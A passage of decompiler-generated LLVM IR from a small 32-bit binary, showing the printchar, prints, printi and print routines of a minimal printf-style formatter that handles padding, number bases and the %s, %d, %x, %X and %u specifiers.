  %v4_863c = call i32 @util_memcpy(i8* %v3_863c, i32 %arg2, i32 %v1_862c)
  store i32 %v3_8604, i32* @fp, align 4
  ret i32 %v2_861c
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_8660 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_866c = icmp eq i32 %v0_8660, 0
  br i1 %v2_866c, label %dec_label_pc_86a0, label %dec_label_pc_8674

dec_label_pc_8674:                                ; preds = %entry
  %v1_8678 = inttoptr i32 %v0_8660 to i32*
  %v2_8678 = load i32, i32* %v1_8678, align 4
  %v1_8684 = trunc i32 %arg2 to i8
  %v3_8684 = inttoptr i32 %v2_8678 to i8*
  store i8 %v1_8684, i8* %v3_8684, align 1
  %v2_868c = load i32, i32* %v1_8678, align 4
  %v1_8690 = add i32 %v2_868c, 1
  store i32 %v1_8690, i32* %v1_8678, align 4
  %v9_86b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_86b4

dec_label_pc_86a0:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_86b0 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_86b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_86b4

dec_label_pc_86b4:                                ; preds = %dec_label_pc_8674, %dec_label_pc_86a0
  %v9_86b8 = phi i32 [ %v9_86b8.pre, %dec_label_pc_8674 ], [ %v3_86b0, %dec_label_pc_86a0 ]
  ret i32 %v9_86b8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_86b4, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_86c0 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8778, label %dec_label_pc_86f8

dec_label_pc_86f8:                                ; preds = %entry
  %v2_872819 = load i8, i8* %arg2, align 1
  %v2_872c21 = icmp eq i8 %v2_872819, 0
  br i1 %v2_872c21, label %dec_label_pc_8734, label %dec_label_pc_870c

dec_label_pc_870c:                                ; preds = %dec_label_pc_86f8, %dec_label_pc_870c
  %v4_872423 = phi i32 [ %v1_871c, %dec_label_pc_870c ], [ %tmp, %dec_label_pc_86f8 ]
  %stack_var_-40.022 = phi i32 [ %v1_8710, %dec_label_pc_870c ], [ 0, %dec_label_pc_86f8 ]
  %v1_8710 = add i32 %stack_var_-40.022, 1
  %v1_871c = add i32 %v4_872423, 1
  %v5_8720 = inttoptr i32 %v1_871c to i8*
  %v2_8728 = load i8, i8* %v5_8720, align 1
  %v2_872c = icmp eq i8 %v2_8728, 0
  br i1 %v2_872c, label %dec_label_pc_8734, label %dec_label_pc_870c

dec_label_pc_8734:                                ; preds = %dec_label_pc_870c, %dec_label_pc_86f8
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_86f8 ], [ %v1_8710, %dec_label_pc_870c ]
  %v5_8740 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8740, label %dec_label_pc_8750, label %dec_label_pc_8760

dec_label_pc_8750:                                ; preds = %dec_label_pc_8734
  %v2_8758 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8760

dec_label_pc_8760:                                ; preds = %dec_label_pc_8734, %dec_label_pc_8750
  %storemerge3 = phi i32 [ %v2_8758, %dec_label_pc_8750 ], [ 0, %dec_label_pc_8734 ]
  %v1_8764 = and i32 %arg4, 2
  %v2_8768 = icmp eq i32 %v1_8764, 0
  br i1 %v2_8768, label %dec_label_pc_8778, label %dec_label_pc_8770

dec_label_pc_8770:                                ; preds = %dec_label_pc_8760
  br label %dec_label_pc_8778

dec_label_pc_8778:                                ; preds = %entry, %dec_label_pc_8760, %dec_label_pc_8770
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8760 ], [ %storemerge3, %dec_label_pc_8770 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8760 ], [ 48, %dec_label_pc_8770 ]
  %v1_877c = urem i32 %arg4, 2
  %v2_8780 = icmp eq i32 %v1_877c, 0
  br i1 %v2_8780, label %dec_label_pc_87b0.preheader, label %dec_label_pc_87ec.preheader

dec_label_pc_87b0.preheader:                      ; preds = %dec_label_pc_8778
  %v5_87b816 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_87b816, label %dec_label_pc_878c.lr.ph, label %dec_label_pc_87ec.preheader

dec_label_pc_878c.lr.ph:                          ; preds = %dec_label_pc_87b0.preheader
  %v2_8794 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_878c

dec_label_pc_878c:                                ; preds = %dec_label_pc_878c.lr.ph, %dec_label_pc_878c
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_878c.lr.ph ], [ %v1_87a8, %dec_label_pc_878c ]
  %v3_8794 = call i32 @printchar(i32* %v2_8794, i32 %stack_var_-44.0)
  %v3_8798 = load i32, i32* %stack_var_-48, align 4
  %v1_879c = add i32 %v3_8798, 1
  store i32 %v1_879c, i32* %stack_var_-48, align 4
  %v1_87a8 = add nsw i32 %stack_var_-28.117, -1
  %v5_87b8 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_87b8, label %dec_label_pc_878c, label %dec_label_pc_87ec.preheader

dec_label_pc_87ec.preheader:                      ; preds = %dec_label_pc_878c, %dec_label_pc_87b0.preheader, %dec_label_pc_8778
  %v3_883027 = phi i32 [ 0, %dec_label_pc_8778 ], [ 0, %dec_label_pc_87b0.preheader ], [ %v1_879c, %dec_label_pc_878c ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8778 ], [ %stack_var_-28.0, %dec_label_pc_87b0.preheader ], [ 0, %dec_label_pc_878c ]
  %v2_87f09 = load i8, i8* %arg2, align 1
  %v2_87f411 = icmp eq i8 %v2_87f09, 0
  br i1 %v2_87f411, label %dec_label_pc_8824.preheader, label %dec_label_pc_87c0.lr.ph

dec_label_pc_87c0.lr.ph:                          ; preds = %dec_label_pc_87ec.preheader
  %v2_87d0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_87c0

dec_label_pc_87c0:                                ; preds = %dec_label_pc_87c0.lr.ph, %dec_label_pc_87c0
  %v4_87ec13 = phi i32 [ %tmp, %dec_label_pc_87c0.lr.ph ], [ %v1_87e4, %dec_label_pc_87c0 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_87c0.lr.ph ], [ %v5_87e8, %dec_label_pc_87c0 ]
  %v2_87c4 = load i8, i8* %stack_var_-24.012, align 1
  %v3_87c4 = zext i8 %v2_87c4 to i32
  %v3_87d0 = call i32 @printchar(i32* %v2_87d0, i32 %v3_87c4)
  %v3_87d4 = load i32, i32* %stack_var_-48, align 4
  %v1_87d8 = add i32 %v3_87d4, 1
  store i32 %v1_87d8, i32* %stack_var_-48, align 4
  %v1_87e4 = add i32 %v4_87ec13, 1
  %v5_87e8 = inttoptr i32 %v1_87e4 to i8*
  %v2_87f0 = load i8, i8* %v5_87e8, align 1
  %v2_87f4 = icmp eq i8 %v2_87f0, 0
  br i1 %v2_87f4, label %dec_label_pc_8824.preheader, label %dec_label_pc_87c0

dec_label_pc_8824.preheader:                      ; preds = %dec_label_pc_87c0, %dec_label_pc_87ec.preheader
  %v3_883026 = phi i32 [ %v3_883027, %dec_label_pc_87ec.preheader ], [ %v1_87d8, %dec_label_pc_87c0 ]
  %v5_882c6 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_882c6, label %dec_label_pc_8800.lr.ph, label %dec_label_pc_8830

dec_label_pc_8800.lr.ph:                          ; preds = %dec_label_pc_8824.preheader
  %v2_8808 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8800

dec_label_pc_8800:                                ; preds = %dec_label_pc_8800.lr.ph, %dec_label_pc_8800
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_8800.lr.ph ], [ %v1_881c, %dec_label_pc_8800 ]
  %v3_8808 = call i32 @printchar(i32* %v2_8808, i32 %stack_var_-44.0)
  %v3_880c = load i32, i32* %stack_var_-48, align 4
  %v1_8810 = add i32 %v3_880c, 1
  store i32 %v1_8810, i32* %stack_var_-48, align 4
  %v1_881c = add nsw i32 %stack_var_-28.37, -1
  %v5_882c = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_882c, label %dec_label_pc_8800, label %dec_label_pc_8830

dec_label_pc_8830:                                ; preds = %dec_label_pc_8800, %dec_label_pc_8824.preheader
  %v3_8830 = phi i32 [ %v3_883026, %dec_label_pc_8824.preheader ], [ %v1_8810, %dec_label_pc_8800 ]
  store i32 %v3_86c0, i32* @fp, align 4
  ret i32 %v3_8830

; uselistorder directives
  uselistorder i32 %v1_87e4, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_871c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8800, { 1, 0 }
  uselistorder label %dec_label_pc_87c0, { 1, 0 }
  uselistorder label %dec_label_pc_878c, { 1, 0 }
  uselistorder label %dec_label_pc_8778, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8760, { 1, 0 }
  uselistorder label %dec_label_pc_870c, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_8844 = load i32, i32* @fp, align 4
  store i32 34892, i32* %stack_var_-4, align 4
  %v2_8848 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8848, i32* @fp, align 4
  %v1_887c = icmp slt i32 %arg2, 0
  %v2_887c = icmp eq i32 %arg2, 0
  br i1 %v2_887c, label %dec_label_pc_8884, label %dec_label_pc_88b8

dec_label_pc_8884:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_88a8 = bitcast i32* %stack_var_-28 to i8*
  %v6_88a8 = call i32 @prints(i32 %arg1, i8* %v5_88a8, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_8a18

dec_label_pc_88b8:                                ; preds = %entry
  %v2_88bc = icmp eq i32 %arg4, 0
  br i1 %v2_88bc, label %dec_label_pc_88f0, label %dec_label_pc_88c4

dec_label_pc_88c4:                                ; preds = %dec_label_pc_88b8
  %v7_88c8 = icmp eq i32 %arg3, 10
  br i1 %v7_88c8, label %dec_label_pc_88d0, label %dec_label_pc_88f0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_88c4
  br i1 %v1_887c, label %dec_label_pc_88dc, label %dec_label_pc_88f0

dec_label_pc_88dc:                                ; preds = %dec_label_pc_88d0
  %v1_88e8 = sub i32 0, %arg2
  br label %dec_label_pc_88f0

dec_label_pc_88f0:                                ; preds = %dec_label_pc_88d0, %dec_label_pc_88c4, %dec_label_pc_88b8, %dec_label_pc_88dc
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_88b8 ], [ %v1_88e8, %dec_label_pc_88dc ], [ %arg2, %dec_label_pc_88d0 ], [ %arg2, %dec_label_pc_88c4 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_88b8 ], [ 1, %dec_label_pc_88dc ], [ 0, %dec_label_pc_88d0 ], [ 0, %dec_label_pc_88c4 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_89844 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_89844, label %dec_label_pc_898c, label %dec_label_pc_890c.lr.ph

dec_label_pc_890c.lr.ph:                          ; preds = %dec_label_pc_88f0
  %v2_8938 = add i32 %arg7, -58
  br label %dec_label_pc_890c

dec_label_pc_890c:                                ; preds = %dec_label_pc_890c.lr.ph, %dec_label_pc_8944
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_890c.lr.ph ], [ %v2_8974, %dec_label_pc_8944 ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_890c.lr.ph ], [ %v5_894c, %dec_label_pc_8944 ]
  %v2_8918 = urem i32 %stack_var_-48.16, %arg3
  %v7_892c = icmp slt i32 %v2_8918, 10
  br i1 %v7_892c, label %dec_label_pc_8944, label %dec_label_pc_8930

dec_label_pc_8930:                                ; preds = %dec_label_pc_890c
  %v1_893c = add i32 %v2_8938, %v2_8918
  br label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_890c, %dec_label_pc_8930
  %stack_var_-60.0 = phi i32 [ %v2_8918, %dec_label_pc_890c ], [ %v1_893c, %dec_label_pc_8930 ]
  %v4_8944 = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8948 = add i32 %v4_8944, -1
  %v5_894c = inttoptr i32 %v1_8948 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_8964 = trunc i32 %fold to i8
  store i8 %v1_8964, i8* %v5_894c, align 1
  %v2_8974 = udiv i32 %stack_var_-48.16, %arg3
  %v2_8984 = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_8984, label %dec_label_pc_898c, label %dec_label_pc_890c

dec_label_pc_898c:                                ; preds = %dec_label_pc_8944, %dec_label_pc_88f0
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_88f0 ], [ %v5_894c, %dec_label_pc_8944 ]
  %v2_8990 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8990, label %dec_label_pc_89f4, label %dec_label_pc_8998

dec_label_pc_8998:                                ; preds = %dec_label_pc_898c
  %v3_8998 = load i32, i32* %stack_var_0, align 4
  %v2_899c = icmp eq i32 %v3_8998, 0
  br i1 %v2_899c, label %dec_label_pc_89dc, label %dec_label_pc_89a4

dec_label_pc_89a4:                                ; preds = %dec_label_pc_8998
  %v1_89a8 = and i32 %arg6, 2
  %v2_89ac = icmp eq i32 %v1_89a8, 0
  br i1 %v2_89ac, label %dec_label_pc_89dc, label %dec_label_pc_89b4

dec_label_pc_89b4:                                ; preds = %dec_label_pc_89a4
  %v2_89bc = inttoptr i32 %arg1 to i32*
  %v3_89bc = call i32 @printchar(i32* %v2_89bc, i32 45)
  %v3_89cc = load i32, i32* %stack_var_0, align 4
  %v1_89d0 = add i32 %v3_89cc, -1
  store i32 %v1_89d0, i32* %stack_var_0, align 4
  br label %dec_label_pc_89f4

dec_label_pc_89dc:                                ; preds = %dec_label_pc_89a4, %dec_label_pc_8998
  %v4_89dc = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_89e0 = add i32 %v4_89dc, -1
  %v5_89e4 = inttoptr i32 %v1_89e0 to i8*
  store i8 45, i8* %v5_89e4, align 1
  br label %dec_label_pc_89f4

dec_label_pc_89f4:                                ; preds = %dec_label_pc_898c, %dec_label_pc_89b4, %dec_label_pc_89dc
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_898c ], [ %v5_89e4, %dec_label_pc_89dc ], [ %stack_var_-64.0.lcssa, %dec_label_pc_89b4 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_898c ], [ 0, %dec_label_pc_89dc ], [ 1, %dec_label_pc_89b4 ]
  %v3_89fc = load i32, i32* %stack_var_0, align 4
  %v6_8a04 = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_89fc, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8a10 = add i32 %v6_8a04, %stack_var_-52.0
  br label %dec_label_pc_8a18

dec_label_pc_8a18:                                ; preds = %dec_label_pc_8884, %dec_label_pc_89f4
  %storemerge2 = phi i32 [ %v2_8a10, %dec_label_pc_89f4 ], [ %v6_88a8, %dec_label_pc_8884 ]
  store i32 %v3_8844, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_894c, { 0, 2, 1 }
  uselistorder i32 %v2_8918, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a18, { 1, 0 }
  uselistorder label %dec_label_pc_89f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8944, { 1, 0 }
  uselistorder label %dec_label_pc_890c, { 1, 0 }
  uselistorder label %dec_label_pc_88f0, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 35380, i32* %stack_var_-4, align 4
  %v2_8a30 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8a30, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8ddc29 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8de031 = icmp eq i8 %v2_8ddc29, 0
  br i1 %v2_8de031, label %dec_label_pc_8de8, label %dec_label_pc_8a50.lr.ph

dec_label_pc_8a50.lr.ph:                          ; preds = %entry
  %v5_8d94 = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8a50

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a50.lr.ph, %dec_label_pc_8dcc
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8a50.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8dcc ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8a50.lr.ph ], [ %v1_8dd0, %dec_label_pc_8dcc ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8a50.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8dcc ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8a50.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8dcc ]
  %v2_8a54 = load i8, i8* %stack_var_-28.435, align 1
  %v7_8a58 = icmp eq i8 %v2_8a54, 37
  br i1 %v7_8a58, label %dec_label_pc_8a60, label %dec_label_pc_8dac

dec_label_pc_8a60:                                ; preds = %dec_label_pc_8a50
  %v1_8a64 = add i32 %stack_var_-28.4.in34, 1
  %v5_8a68 = inttoptr i32 %v1_8a64 to i8*
  %v2_8a80 = load i8, i8* %v5_8a68, align 1
  %v2_8a84 = icmp eq i8 %v2_8a80, 0
  br i1 %v2_8a84, label %dec_label_pc_8de8, label %dec_label_pc_8a8c

dec_label_pc_8a8c:                                ; preds = %dec_label_pc_8a60
  %v2_8a90 = load i8, i8* %v5_8a68, align 1
  %v7_8a94 = icmp eq i8 %v2_8a90, 37
  br i1 %v7_8a94, label %dec_label_pc_8dac, label %dec_label_pc_8a9c

dec_label_pc_8a9c:                                ; preds = %dec_label_pc_8a8c
  %v2_8aa0 = load i8, i8* %v5_8a68, align 1
  %v7_8aa4 = icmp eq i8 %v2_8aa0, 45
  br i1 %v7_8aa4, label %dec_label_pc_8aac, label %dec_label_pc_8adc.preheader

dec_label_pc_8aac:                                ; preds = %dec_label_pc_8a9c
  %v1_8ab0 = add i32 %stack_var_-28.4.in34, 2
  %v5_8ab4 = inttoptr i32 %v1_8ab0 to i8*
  br label %dec_label_pc_8adc.preheader

dec_label_pc_8adc.preheader:                      ; preds = %dec_label_pc_8aac, %dec_label_pc_8a9c
  %stack_var_-28.0.ph = phi i8* [ %v5_8a68, %dec_label_pc_8a9c ], [ %v5_8ab4, %dec_label_pc_8aac ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8a9c ], [ 1, %dec_label_pc_8aac ]
  %v4_8adc2 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_8ae03 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_8ae47 = icmp eq i8 %v2_8ae03, 48
  br i1 %v7_8ae47, label %dec_label_pc_8ac4, label %dec_label_pc_8b28.preheader

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8adc.preheader, %dec_label_pc_8ac4
  %v4_8adc9 = phi i32 [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v4_8adc2, %dec_label_pc_8adc.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_8ad4, %dec_label_pc_8ac4 ], [ %stack_var_-44.0.ph, %dec_label_pc_8adc.preheader ]
  %v1_8ac8 = add i32 %v4_8adc9, 1
  %v5_8acc = inttoptr i32 %v1_8ac8 to i8*
  %v1_8ad4 = or i32 %stack_var_-44.08, 2
  %v2_8ae0 = load i8, i8* %v5_8acc, align 1
  %v7_8ae4 = icmp eq i8 %v2_8ae0, 48
  br i1 %v7_8ae4, label %dec_label_pc_8ac4, label %dec_label_pc_8b28.preheader

dec_label_pc_8b28.preheader:                      ; preds = %dec_label_pc_8ac4, %dec_label_pc_8adc.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8adc.preheader ], [ %v1_8ad4, %dec_label_pc_8ac4 ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8adc.preheader ], [ %v5_8acc, %dec_label_pc_8ac4 ]
  %v4_8b2811 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_8b2c12 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8b2c12, 48
  br i1 %tmp60, label %dec_label_pc_8b48, label %dec_label_pc_8b38

dec_label_pc_8af0:                                ; preds = %dec_label_pc_8b38
  %v2_8afc = mul i32 %stack_var_-48.019, 10
  %v2_8b08 = load i8, i8* %stack_var_-28.120, align 1
  %v3_8b08 = zext i8 %v2_8b08 to i32
  %v2_8b10 = add i32 %v2_8afc, -48
  %v1_8b14 = add i32 %v2_8b10, %v3_8b08
  %v1_8b20 = add i32 %v4_8b2821, 1
  %v5_8b24 = inttoptr i32 %v1_8b20 to i8*
  %v2_8b2c = load i8, i8* %v5_8b24, align 1
  %tmp61 = icmp ult i8 %v2_8b2c, 48
  br i1 %tmp61, label %dec_label_pc_8b48, label %dec_label_pc_8b38

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8b28.preheader, %dec_label_pc_8af0
  %v4_8b2821 = phi i32 [ %v1_8b20, %dec_label_pc_8af0 ], [ %v4_8b2811, %dec_label_pc_8b28.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_8b24, %dec_label_pc_8af0 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_8b28.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_8b14, %dec_label_pc_8af0 ], [ 0, %dec_label_pc_8b28.preheader ]
  %v2_8b3c = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_8b3c, 58
  br i1 %tmp62, label %dec_label_pc_8af0, label %dec_label_pc_8b48

dec_label_pc_8b48:                                ; preds = %dec_label_pc_8af0, %dec_label_pc_8b38, %dec_label_pc_8b28.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_8b28.preheader ], [ %v1_8b14, %dec_label_pc_8af0 ], [ %stack_var_-48.019, %dec_label_pc_8b38 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_8b28.preheader ], [ %v5_8b24, %dec_label_pc_8af0 ], [ %stack_var_-28.120, %dec_label_pc_8b38 ]
  %v2_8b4c = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b50 = icmp eq i8 %v2_8b4c, 115
  br i1 %v7_8b50, label %dec_label_pc_8b58, label %dec_label_pc_8bbc

dec_label_pc_8b58:                                ; preds = %dec_label_pc_8b48
  %v1_8b5c = add i32 %stack_var_-32.133, 4
  %v1_8b68 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b68 = load i32, i32* %v1_8b68, align 4
  %v2_8b74 = icmp eq i32 %v2_8b68, 0
  br i1 %v2_8b74, label %dec_label_pc_8b88, label %dec_label_pc_8b7c

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b58
  %v5_8b80 = inttoptr i32 %v2_8b68 to i8*
  br label %dec_label_pc_8b90

dec_label_pc_8b88:                                ; preds = %dec_label_pc_8b58
  br label %dec_label_pc_8b90

dec_label_pc_8b90:                                ; preds = %dec_label_pc_8b7c, %dec_label_pc_8b88
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_11e6c.40, i32 0, i32 0), %dec_label_pc_8b88 ], [ %v5_8b80, %dec_label_pc_8b7c ]
  %v7_8ba4 = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8bb0 = add i32 %v7_8ba4, %stack_var_-40.132
  br label %dec_label_pc_8dcc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8b48
  %v2_8bc0 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8bc4 = icmp eq i8 %v2_8bc0, 100
  br i1 %v7_8bc4, label %dec_label_pc_8bcc, label %dec_label_pc_8c20

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8bbc
  %v1_8bd0 = add i32 %stack_var_-32.133, 4
  %v1_8bdc = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bdc = load i32, i32* %v1_8bdc, align 4
  %v7_8c08 = call i32 @printi(i32 %tmp, i32 %v2_8bdc, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8c14 = add i32 %v7_8c08, %stack_var_-40.132
  br label %dec_label_pc_8dcc

dec_label_pc_8c20:                                ; preds = %dec_label_pc_8bbc
  %v2_8c24 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c28 = icmp eq i8 %v2_8c24, 120
  br i1 %v7_8c28, label %dec_label_pc_8c30, label %dec_label_pc_8c84

dec_label_pc_8c30:                                ; preds = %dec_label_pc_8c20
  %v1_8c34 = add i32 %stack_var_-32.133, 4
  %v1_8c40 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c40 = load i32, i32* %v1_8c40, align 4
  %v7_8c6c = call i32 @printi(i32 %tmp, i32 %v2_8c40, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8c78 = add i32 %v7_8c6c, %stack_var_-40.132
  br label %dec_label_pc_8dcc

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c20
  %v2_8c88 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c8c = icmp eq i8 %v2_8c88, 88
  br i1 %v7_8c8c, label %dec_label_pc_8c94, label %dec_label_pc_8ce8

dec_label_pc_8c94:                                ; preds = %dec_label_pc_8c84
  %v1_8c98 = add i32 %stack_var_-32.133, 4
  %v1_8ca4 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8ca4 = load i32, i32* %v1_8ca4, align 4
  %v7_8cd0 = call i32 @printi(i32 %tmp, i32 %v2_8ca4, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8cdc = add i32 %v7_8cd0, %stack_var_-40.132
  br label %dec_label_pc_8dcc

dec_label_pc_8ce8:                                ; preds = %dec_label_pc_8c84
  %v2_8cec = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8cf0 = icmp eq i8 %v2_8cec, 117
  br i1 %v7_8cf0, label %dec_label_pc_8cf8, label %dec_label_pc_8d4c

dec_label_pc_8cf8:                                ; preds = %dec_label_pc_8ce8
  %v1_8cfc = add i32 %stack_var_-32.133, 4
  %v1_8d08 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8d08 = load i32, i32* %v1_8d08, align 4
  %v7_8d34 = call i32 @printi(i32 %tmp, i32 %v2_8d08, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8d40 = add i32 %v7_8d34, %stack_var_-40.132
  br label %dec_label_pc_8dcc

dec_label_pc_8d4c:                                ; preds = %dec_label_pc_8ce8
  %v2_8d50 = load i8, i8* %stack_var_-28.1.lcssa, align 1
